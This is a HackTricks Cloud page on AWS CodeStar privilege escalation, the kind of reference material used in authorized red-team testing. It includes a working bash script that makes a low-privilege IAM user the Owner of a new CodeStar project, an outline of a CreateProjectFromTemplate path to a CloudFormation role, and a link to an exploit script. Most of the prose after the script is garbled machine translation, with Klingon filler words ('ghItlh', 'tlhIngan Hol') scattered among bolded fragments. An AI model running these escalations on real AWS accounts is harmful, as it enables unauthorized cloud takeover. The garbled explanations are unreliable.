# AWS - Codestar Privesc

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Codestar

You can find more information about codestar in:

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `iam:PassRole`, `codestar:CreateProject`

With these permissions you can **abuse a codestar IAM Role** to perform **arbitrary actions** through a **cloudformation template**. Check the following page:

{% content-ref url="iam-passrole-codestar-createproject.md" %}
[iam-passrole-codestar-createproject.md](iam-passrole-codestar-createproject.md)
{% endcontent-ref %}

### `codestar:CreateProject`, `codestar:AssociateTeamMember`

This technique uses `codestar:CreateProject` to create a codestar project, and `codestar:AssociateTeamMember` to make an IAM user the **owner** of a new CodeStar **project**, which will grant them a **new policy with a few extra permissions**.
```bash
PROJECT_NAME="supercodestar"

aws --profile "$NON_PRIV_PROFILE_USER" codestar create-project \
--name $PROJECT_NAME \
--id $PROJECT_NAME

echo "Waiting 1min to start the project"
sleep 60

USER_ARN=$(aws --profile "$NON_PRIV_PROFILE_USER" opsworks describe-my-user-profile | jq .UserProfile.IamUserArn | tr -d '"')

aws --profile "$NON_PRIV_PROFILE_USER" codestar associate-team-member \
--project-id $PROJECT_NAME \
--user-arn "$USER_ARN" \
--project-role "Owner" \
--remote-access-allowed
```
**ghItlh:** **ghItlh** **project** **member** **vaj** **permission** **`codestar:UpdateTeamMember`** **ghItlh** **role** **owner** **`codestar:AssociateTeamMember`** **ghItlh**.

**Potential Impact:** **codestar** **policy** **privesc**. **Example** **policy** **ghItlh** **tlhIngan Hol** **ghItlh**:

{% content-ref url="codestar-createproject-codestar-associateteammember.md" %}
[codestar-createproject-codestar-associateteammember.md](codestar-createproject-codestar-associateteammember.md)
{% endcontent-ref %}

### `codestar:CreateProjectFromTemplate`

1. **New Project** **luq:** 
- **`codestar:CreateProjectFromTemplate`** **ghItlh** **action** **ghItlh** **new project** **creation** **initiate**.
- **creation** **vaj** **access** **automatically** **granted** **`cloudformation:UpdateStack`**.
- **access** **ghItlh** **specifically** **target** **stack** **`CodeStarWorker-<generic project name>-CloudFormation`** **IAM role**.

2. **Target Stack** **ghItlh** **Update** **luq**:
- **granted** **CloudFormation** **permissions** **ghItlh** **proceed** **update** **specified stack**.
- **stack** **name** **typically** **conform** **two patterns**:
- `awscodestar-<generic project name>-infrastructure`
- `awscodestar-<generic project name>-lambda`
- **exact name** **depends** **chosen template** (referencing **example exploit script**).

3. **Access** **Permissions** **ghItlh**:
- **Post-update**, **capabilities** **obtain** **CloudFormation IAM role** **linked** **stack**.
- **Note**: **ghItlh** **inherently** **provide** **full administrator privileges**. **Additional misconfigured resources** **environment** **required** **elevate privileges** **further**.

**ghItlh** **information** **original research** **check**: [https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/](https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/).\
**exploit** **ghItlh** **find** **[https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py](https://github.com/RhinoSecurityLabs/Cloud-Security-Research/blob/master/AWS/codestar\_createprojectfromtemplate\_privesc/CodeStarPrivEsc.py)**

**Potential Impact:** **cloudformation IAM role** **privesc**.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>tlhIngan Hol</strong></a><strong>!</strong></summary>

**HackTricks** **support** **ways**:

* **company** **advertised** **HackTricks** **download HackTricks** **PDF** **Check** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* **official PEASS & HackTricks swag** **ghItlh** **[**opensea.io**](https://peass.creator-spring.com)**
* **PEASS Family** **ghItlh** **[**NFTs**](https://opensea.io/collection/the-peass-family)** **ghItlh** **[**The PEASS Family**](https://opensea.io/collection/the-peass-family)**
* **Join** üí¨ **Discord group** **ghItlh** **[**discord.gg**](https://discord.gg/hRep4RUj7f)** **telegram group** **ghItlh** **[**t.me**](https://t.me/peass)** **follow** **Twitter** üê¶ **[**@hacktricks_live**](https://twitter.com/hacktricks_live)**.
* **Share** **hacking tricks** **submitting PRs** **HackTricks** **HackTricks Cloud** **github repos** **ghItlh**.

</details>
